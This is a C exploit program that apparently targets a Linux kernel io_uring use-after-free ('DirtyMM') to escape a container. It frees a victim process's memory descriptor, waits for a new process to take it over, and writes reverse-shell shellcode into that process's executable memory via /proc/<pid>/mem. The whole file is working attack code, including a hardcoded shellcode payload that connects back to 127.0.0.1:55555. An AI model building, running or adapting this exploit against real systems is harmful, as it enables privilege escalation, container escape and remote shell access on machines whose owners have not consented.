// gcc exp_dirtymm_container.c -o exp_dirtymm_container -no-pie -static -s \
//     -luring -lpthread -L ./liburing/ -I ./liburing/include

#define _GNU_SOURCE

#include <assert.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syscall.h>
#include <unistd.h>

#include "liburing.h"

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...)                                                         \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                         \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,      \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                         \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,     \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                         \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__,        \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                                                          \
    do {                                                                       \
        loge(fmt, ##__VA_ARGS__);                                              \
        loge("Exit at line %d", __LINE__);                                     \
        exit(1);                                                               \
    } while (0)

#define SPRAY_PROCESS_CNT 300

#define NOP_BYTES '\x90'

// reverse shell to 127.0.0.1:55555
unsigned char payload[] = {
    0x6a, 0x29, 0x58, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x99, 0x0f, 0x05,
    0x48, 0x89, 0xc5, 0x48, 0xb8, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
    0x02, 0x50, 0x48, 0xb8, 0x03, 0x01, 0xd8, 0x02, 0x7e, 0x01, 0x01, 0x03,
    0x48, 0x31, 0x04, 0x24, 0x6a, 0x2a, 0x58, 0x48, 0x89, 0xef, 0x6a, 0x10,
    0x5a, 0x48, 0x89, 0xe6, 0x0f, 0x05, 0x48, 0x89, 0xef, 0x31, 0xf6, 0x6a,
    0x21, 0x58, 0x0f, 0x05, 0x48, 0x89, 0xef, 0x6a, 0x01, 0x5e, 0x6a, 0x21,
    0x58, 0x0f, 0x05, 0x48, 0x89, 0xef, 0x6a, 0x02, 0x5e, 0x6a, 0x21, 0x58,
    0x0f, 0x05, 0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
    0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x01, 0x01, 0x81,
    0x34, 0x24, 0x01, 0x01, 0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e,
    0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58,
    0x0f, 0x05};

pid_t child1;
char dummy;
int mem_rfd, mem_wfd, mem_wfd_2, map_fd;

void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void trigger_fd_uaf(int fd) {
#ifndef REQ_F_FIXED_FILE
#define REQ_F_FIXED_FILE 1
#endif
    logd("trigger fd %d UAF ...", fd);

    struct io_uring ring;
    struct io_uring_sqe *sqe;
    io_uring_queue_init(64, &ring, 0);
    io_uring_register_files(&ring, &fd, 1);

    for (int i = 0; i < 2; i++) {
        sqe = io_uring_get_sqe(&ring);
        sqe->opcode = IORING_OP_MSG_RING;
        sqe->flags = REQ_F_FIXED_FILE;
        sqe->fd = 0;
        io_uring_submit(&ring);
    }

    // default mm->count == 4
    logd("utilize dup2() to trigger mmdrop() ...");
    for (int i = 0; i < 4; i++) {
        dup2(fd, 0x100 + i);
        close(0x100 + i);
    }

    // init_task_work(&file->f_u.fu_rcuhead, ____fput);
    logd("wait task ____fput() to free the struct file ...");
    usleep(200 * 1000);
}

void victim_child(void) {
    int dummy_pipe[2];
    pipe(dummy_pipe);
    logd("victim child stuck at read forever ...");
    read(dummy_pipe[0], &dummy, 1);
}

void parse_map_and_inject_shellcode(int map, int mem) {
    char names[0x1000];
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    size_t start, end;
    char flag[5] = {0};
    size_t dummy_data;

    FILE *map_fp = fdopen(map, "r");

    memset(names, 0, sizeof(names));
    while ((read = getline(&line, &len, map_fp)) != -1) {
        sscanf(line, "%lx-%lx %c%c%c%c %08lx %02lx:%02lx %lu %s", &start, &end,
               flag, flag + 1, flag + 2, flag + 3, &dummy_data, &dummy_data,
               &dummy_data, &dummy_data, names);

        if (flag[2] == 'x') {
            // don't touch vsyscall
            if (start > 0x8000000000000000ULL) {
                continue;
            }

            size_t segment_length = end - start;
            lseek(mem, start, SEEK_SET);
            char *temp_buffer = (char *)malloc(segment_length);
            if (!temp_buffer) {
                die("malloc with size %lx failed: %m", segment_length);
            }
            memset(temp_buffer, NOP_BYTES, segment_length);
            memcpy(temp_buffer + segment_length - sizeof(payload), payload,
                   sizeof(payload));
            ssize_t write_cnt = write(mem, temp_buffer, segment_length);
            if (write_cnt <= 0) {
                loge("write mem count %ld, %m", write_cnt);
            }
            free(temp_buffer);
        }
    }
}

int main(void) {

retry:
    // init victim process
    child1 = fork();
    if (child1 < 0) {
        die("fork: %m");
    }
    if (!child1) {
        // child1 go here
        bind_cpu(0);
        victim_child();
        exit(0);
    }
    bind_cpu(0);
    sleep(1);

    char *child1_mem_path;
    char *child1_map_path;
    asprintf(&child1_mem_path, "/proc/%d/mem", child1);
    asprintf(&child1_map_path, "/proc/%d/maps", child1);

    mem_rfd = open(child1_mem_path, O_RDONLY);
    mem_wfd = open(child1_mem_path, O_WRONLY);
    if (mem_wfd < 0) {
        die("open mem_wfd: %m");
    }
    mem_wfd_2 = open(child1_mem_path, O_WRONLY);
    if (mem_wfd_2 < 0) {
        die("open mem_wfd_2: %m");
    }
    map_fd = open(child1_map_path, O_RDONLY);
    if (map_fd < 0) {
        die("open map_fp: %m");
    }

    char *cmdline;
    char cmdline_buffer[0x1000] = {0};
    asprintf(&cmdline, "/proc/%d/cmdline", child1);

    int cmdline_fd = open(cmdline, O_RDONLY);
    if (cmdline_fd < 0) {
        die("open cmdline_fd: %m");
    }

    lseek(cmdline_fd, 0, SEEK_SET);
    read(cmdline_fd, cmdline_buffer, sizeof(cmdline_buffer));
    char *old_cmdline = strdup(cmdline_buffer);

    logd("release child1's mm_struct ...");
    trigger_fd_uaf(mem_wfd);

    logw("searching new process...");
    while (1) {
        char cmdline_buffer[0x1000] = {0};
        lseek(cmdline_fd, 0, SEEK_SET);
        read(cmdline_fd, cmdline_buffer, sizeof(cmdline_buffer));
        if (!strlen(cmdline_buffer)) {
            logw("get empty cmdline, wait a minute ...");
            sleep(1);
            lseek(cmdline_fd, 0, SEEK_SET);
            read(cmdline_fd, cmdline_buffer, sizeof(cmdline_buffer));
        }

        if (strcmp(cmdline_buffer, old_cmdline)) {
            logd("get cmdline: %s", cmdline_buffer);
            if (!strlen(cmdline_buffer)) {
                goto retry;
            }
            logi("wanna this ? [0/1]");
            int answer = 0;
            scanf("%d", &answer);
            if (answer) {
                goto inject_shellcode;
            } else {
                goto retry;
            }
        }
        usleep(100 * 1000);
    }

inject_shellcode:
    logd("parse suid process maps ...");
    parse_map_and_inject_shellcode(map_fd, mem_wfd_2);

    logw("main process sleep forever ...");
    while (1) {
        sleep(100);
    }

    return 0;
}

